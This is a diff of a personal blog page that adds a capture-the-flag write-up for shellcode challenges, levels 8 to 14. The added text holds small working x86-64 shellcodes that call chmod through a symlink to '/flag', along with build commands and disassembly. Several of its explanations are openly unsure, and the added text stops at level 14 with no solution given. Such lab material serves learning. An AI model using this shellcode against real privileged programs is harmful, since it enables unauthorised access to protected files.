@@ -319,7 +319,7 @@
 
 
                 <time class="article-time--reading">
-                    13 minute read
+                    16 minute read
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -330,7 +330,7 @@
 
 
                 <time class="article-words">
-                    2655 字
+                    3397 字
                 </time>
             </div>
         
@@ -1349,7 +1349,8 @@ actual functionality of your code begins. When control flow hits any of these in
 </span></span><span class="line"><span class="cl">        .ascii &#34;/flag&#34;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>level6: <strong>Removing write permissions from first 4096 bytes of shellcode</strong></p>
+</div><p><strong>Removing write permissions from first 4096 bytes of shellcode===&gt;</strong></p>
+<p>level6: <strong>Removing write permissions from first 4096 bytes of shellcode</strong></p>
 <p>In order to get the flag, just directly add 4096 repeats in the front of the level5 code</p>
 <p>level7: <strong>close the stdin, stderr, stdout</strong></p>
 <p>This challenge is about to close</p>
@@ -1576,8 +1577,210 @@ actual functionality of your code begins. When control flow hits any of these in
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
-<p><strong>Actually I still don&rsquo;t know why the stderr, stdout, stdin which were being closed work and why the <code>chmod</code> command can solve this question. I just know it is a way to be able to cat the flag</strong></p>
+<p><strong>Actually I still don&rsquo;t know why the stderr, stdout, stdin which were being closed work and why the <code>chmod</code> command can solve this question. I just know it is a way to be able to cat the flag</strong>. Maybe the chmod didn&rsquo;t use the stdin, stdout and stderr so we bypassed it.</p>
 </blockquote>
+<p>level8: <strong>only reading 0x12 bytes from stdin.</strong></p>
+<p>So we should replace the command like <code>mov xxx, xxx</code> and <code>xor xxx, xxx</code> with the <code>push</code> , <code>pop</code> and <code>mov xxx, rsp</code>. the <code>chmod</code> is what we need to do.</p>
+<p>First, the linux <strong>soft link</strong> and <strong>chmod</strong> has a feature that Chmod does not work directly on soft links(which is the link file) when it operates on them, but directly on the files it points to(which is the true file). It just like we link a <code>f</code> file in my home/hacker directory to the <code>/flag</code> and we chmod the <code>f</code> file not the <code>/flag</code> file, if we succeed in changing the permissions of <code>f</code> file, we succeed in changing the permissions of <code>/flag</code> file, too.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ln -s /flag f <span class="c1">#create the soft link</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Second, we use assembly file to chmod: (less than 0x12(18 bytes))</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.global _start
+</span></span><span class="line"><span class="cl">.intel_syntax noprefix
+</span></span><span class="line"><span class="cl">_start:
+</span></span><span class="line"><span class="cl">	push 0x66 #b&#39;f\x00&#39;
+</span></span><span class="line"><span class="cl">	mov rdi, rsp #rdi: f
+</span></span><span class="line"><span class="cl">	push 4	
+</span></span><span class="line"><span class="cl">	pop rsi	#rsi: 4
+</span></span><span class="line"><span class="cl">	mov al, 0x5a # chmod(&#39;f&#39;,4)
+</span></span><span class="line"><span class="cl">	syscall
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, we got a 0xc bytes shellcode.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -nostdlib -static -o <span class="m">1</span> 1.s <span class="p">&amp;</span> objcopy --dump-section .text<span class="o">=</span>out <span class="m">1</span> <span class="p">&amp;</span> cat out <span class="p">|</span> /challenge/babyshell_level8
+</span></span><span class="line"><span class="cl"><span class="o">==================================================================</span>
+</span></span><span class="line"><span class="cl">      Address      <span class="p">|</span>           Bytes          <span class="p">|</span>  Instructions
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">0x000000002df88000 <span class="p">|</span> 6a <span class="m">66</span>                    <span class="p">|</span> push 0x66
+</span></span><span class="line"><span class="cl">0x000000002df88002 <span class="p">|</span> <span class="m">48</span> <span class="m">89</span> e7                 <span class="p">|</span> mov rdi, rsp
+</span></span><span class="line"><span class="cl">0x000000002df88005 <span class="p">|</span> 6a <span class="m">04</span>                    <span class="p">|</span> push <span class="m">4</span>
+</span></span><span class="line"><span class="cl">0x000000002df88007 <span class="p">|</span> 5e                       <span class="p">|</span> pop rsi
+</span></span><span class="line"><span class="cl">0x000000002df88008 <span class="p">|</span> b0 5a                    <span class="p">|</span> mov al, 0x5a
+</span></span><span class="line"><span class="cl">0x000000002df8800a <span class="p">|</span> 0f <span class="m">05</span>                    <span class="p">|</span> <span class="nv">syscall</span>
+</span></span><span class="line"><span class="cl"><span class="o">===================================================================</span>
+</span></span><span class="line"><span class="cl">cat f <span class="c1">#or cat /flag can get the flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level9: <strong>modified shellcode by overwriting every other 10 bytes with 0xcc.</strong></p>
+<blockquote>
+<p>0xcc, when interpreted as an instruction is an <strong><code>INT 3</code></strong>, which is an interrupt to call into the debugger.Every 10 bytes, our command is overwritten with 10 interrupt commands(int 3 ), so we need to skip it using the <code>.rept .endr</code> and <code>jmp</code></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.global _start
+</span></span><span class="line"><span class="cl">.intel_syntax noprefix
+</span></span><span class="line"><span class="cl">_start:
+</span></span><span class="line"><span class="cl">	push 0x66 		#b&#39;f\x00&#39;  	#6a 66
+</span></span><span class="line"><span class="cl">	mov rdi, rsp				#48 89 e7
+</span></span><span class="line"><span class="cl">	#push 4
+</span></span><span class="line"><span class="cl">	#pop rsi
+</span></span><span class="line"><span class="cl">	mov sil, 4					#40 b6 04
+</span></span><span class="line"><span class="cl">	jmp next					#eb 0a---&gt;10 bytes
+</span></span><span class="line"><span class="cl">.rept 10
+</span></span><span class="line"><span class="cl">	nop
+</span></span><span class="line"><span class="cl">.endr							#10 0xcc
+</span></span><span class="line"><span class="cl">next:
+</span></span><span class="line"><span class="cl">	mov al, 0x5a
+</span></span><span class="line"><span class="cl">	syscall
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat f <span class="c1"># get flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level10: <strong>sorted your shellcode using bubblesort. This sort processed your shellcode 8 bytes at a time.</strong></p>
+<p>Keep in mind the impact of memory endianness(The Byte Storage Order of the memory) on this sort(e.g., the LSB being the right-most byte).</p>
+<blockquote>
+<p>the code of level8 can go through it</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sort_max</span> <span class="o">=</span> <span class="n">shellcode_size</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sort_max</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">sort_max</span><span class="o">-</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">input</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">uint64_t</span> <span class="n">x</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">uint64_t</span> <span class="n">y</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="n">input</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">y</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">input</span><span class="p">[</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf</span><span class="p">(</span><span class="s">&#34;This sort processed your shellcode %d bytes at a time.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//it print &#34;This sort processed your shellcode 8 bytes at a time&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>the sort_max = 12/8 -1 = 0 so we just skip it (?)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">6a 66             | push 0x66
+</span></span><span class="line"><span class="cl">48 89 e7          | mov rdi, rsp
+</span></span><span class="line"><span class="cl">6a 04             | push 4
+</span></span><span class="line"><span class="cl">5e                | pop rsi
+</span></span><span class="line"><span class="cl">b0 5a             | mov al, 0x5a
+</span></span><span class="line"><span class="cl">0f 05             | syscall 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level11:<strong>bubblesort+close stdin, which means that it will be harder to pass in a stage-2 shellcode</strong></p>
+<p>because we only have stage-1 shellcode so we can still use the code of level10 and get the flag.</p>
+<p>level12: <strong>requires that every byte in your shellcode is unique</strong></p>
+<blockquote>
+<p>This level means that each byte of the machine code required to be entered is different. In level11 will be failed in bytes5 because push command is used twice so there&rsquo;re two 6a</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.global _start
+</span></span><span class="line"><span class="cl">.intel_syntax noprefix
+</span></span><span class="line"><span class="cl">_start:
+</span></span><span class="line"><span class="cl">	push 0x66 #b&#39;f\x00&#39;
+</span></span><span class="line"><span class="cl">	mov rdi, rsp
+</span></span><span class="line"><span class="cl">	mov sil, 4
+</span></span><span class="line"><span class="cl">	mov al, 0x5a
+</span></span><span class="line"><span class="cl">	syscall
+</span></span><span class="line"><span class="cl"># get the flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level13: <strong>only reading 0xc bytes from stdin</strong></p>
+<p>in level8 we have already make the code size to 0xc bytes so we can use the level12 code as well. The <code>f</code> file is useful for level8 to level13.</p>
+<p>level14: <strong>only reading 6 bytes from stdin</strong></p>
 
 </section>
 
@@ -1797,7 +2000,7 @@ actual functionality of your code begins. When control flow hits any of these in
         
             
         
-        共 19.04k 字 · 共 10篇文章
+        共 19.78k 字 · 共 10篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
